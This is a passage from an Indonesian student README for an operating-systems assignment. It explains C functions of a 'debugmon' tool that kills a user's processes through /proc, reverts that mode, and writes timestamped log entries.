    uid_t uid_target = pw->pw_uid;
    char log_path[512], flag_path[512];
    get_paths(pw->pw_dir, username, log_path, NULL, flag_path);

    DIR *proc = opendir("/proc");
    if (!proc) {
        perror("opendir");
        return;
    }

    struct dirent *entry;
    while ((entry = readdir(proc))) {
        if (is_number(entry->d_name)) {
            uid_t uid;
            char name[256];
            if (get_process_info(entry->d_name, &uid, name, sizeof(name)) && uid == uid_target) {
                pid_t pid = atoi(entry->d_name);
                if (kill(pid, SIGKILL) == 0)
                    write_log(log_path, name, "FAILED");
            }
        }
    }

    closedir(proc);

    FILE *flag = fopen(flag_path, "w");
    if (flag) {
        fprintf(flag, "FAILING\n");
        fclose(flag);
    }

    printf("Semua proses user '%s' digagalkan. Mode FAILING aktif.\n", username);
    handle_daemon(username);
}
```
- `char log_path[512], flag_path[512];`: Mendeklarasikan variabel untuk menyimpan path log dan flag.
- `get_paths(pw->pw_dir, username, log_path, NULL, flag_path);`: Mengambil path log dan flag berdasarkan direktori home user.
- `struct dirent *entry;`: Mendeklarasikan variabel untuk menyimpan entri direktori.
- `while ((entry = readdir(proc))) { ... }`: Loop untuk membaca setiap entri di dalam direktori `/proc`.
- `if (is_number(entry->d_name)) { ... }`: Memeriksa apakah nama entri adalah angka (PID).
- `if (get_process_info(entry->d_name, &uid, name, sizeof(name)) && uid == uid_target) { ... }`: Mengambil informasi proses berdasarkan PID dan memeriksa apakah UID-nya sesuai dengan UID target.
- `if (kill(pid, SIGKILL) == 0) write_log(log_path, name, "FAILED");`: Mengirim sinyal SIGKILL ke proses dan menulis log jika berhasil.
- `closedir(proc);`: Menutup direktori `/proc` setelah selesai.
- `FILE *flag = fopen(flag_path, "w");`: Membuka file flag untuk menulis.
- `if (flag) { fprintf(flag, "FAILING\n"); fclose(flag); }`: Jika file berhasil dibuka, tulis status "FAILING" dan tutup file.
- `printf("Semua proses user '%s' digagalkan. Mode FAILING aktif.\n", username);`: Menampilkan pesan bahwa semua proses user telah digagalkan dan mode Failing aktif.
- `handle_daemon(username);`: Memanggil fungsi untuk menjalankan daemon dengan user yang sama.

![Image](https://github.com/user-attachments/assets/8ac9be3f-19b0-4945-808e-839d0c4da095)

User tidak bisa menjalankan proses lain


E. Mengizinkan user untuk kembali menjalankan proses
Karena kasihan, Shizuka meminta Doraemon untuk memperbaiki semuanya. Doraemon pun menjalankan:
`./debugmon revert <user>`

`Debugmon kembali ke mode normal dan bisa menjalankan proses lain seperti biasa.`

```bash 
    void handle_revert(const char *username) {
    struct passwd *pw = get_user_info(username);
    if (!pw) return;

    char log_path[512], flag_path[512];
    get_paths(pw->pw_dir, username, log_path, NULL, flag_path);
    remove(flag_path);
    write_log(log_path, "debugmon-revert", "RUNNING");
    printf("Mode FAILING dimatikan untuk user '%s'.\n", username);
    }
```
- `char log_path[512], flag_path[512];`: Mendeklarasikan variabel untuk menyimpan path log dan flag.
- `get_paths(pw->pw_dir, username, log_path, NULL, flag_path);`: Mengambil path log dan flag berdasarkan direktori home user.
- `remove(flag_path);`: Menghapus file flag untuk menonaktifkan mode Failing.

![Image](https://github.com/user-attachments/assets/b18513e6-7e42-4714-b41c-d36582ba3b57)
User sudah bisa menjalankan proses lain

F. Mencatat ke dalam file log
Sebagai dokumentasi untuk mengetahui apa saja yang debugmon lakukan di komputer user, debugmon melakukan pencatatan dan penyimpanan ke dalam file debugmon.log untuk semua proses yang dijalankan dengan format
[dd:mm:yyyy]-[hh:mm:ss]_nama-process_STATUS(RUNNING/FAILED)
Untuk poin b, c, dan e, status proses adalah RUNNING. Sedangkan untuk poin d, status proses adalah FAILED. 

```bash
void write_log(const char *log_path, const char *process_name, const char *status) {
    FILE *log = fopen(log_path, "a");
    if (!log) return;

    char d[64], h[64];
    time_t now = time(NULL);
    strftime(d, sizeof(d), "%d:%m:%Y", localtime(&now));
    strftime(h, sizeof(h), "%H:%M:%S", localtime(&now));
    fprintf(log, "[%s]-[%s]_%s_%s\n", d, h, process_name, status);
    fclose(log);
}
```
- `FILE *log = fopen(log_path, "a");`: Membuka file log untuk ditulis dalam mode append.
- `char d[64], h[64];`: Mendeklarasikan variabel untuk menyimpan tanggal dan waktu.
- `time_t now = time(NULL);`: Mendapatkan waktu saat ini.
- `strftime(d, sizeof(d), "%d:%m:%Y", localtime(&now));`: Mengonversi waktu saat ini menjadi format tanggal.
- `strftime(h, sizeof(h), "%H:%M:%S", localtime(&now));`: Mengonversi waktu saat ini menjadi format jam.
- `fprintf(log, "[%s]-[%s]_%s_%s\n", d, h, process_name, status);`: Menulis log dengan format yang ditentukan.
- `fclose(log);`: Menutup file log setelah selesai menulis.

![Image](https://github.com/user-attachments/assets/824a7dd5-9360-4916-b1be-85a31550bf74)
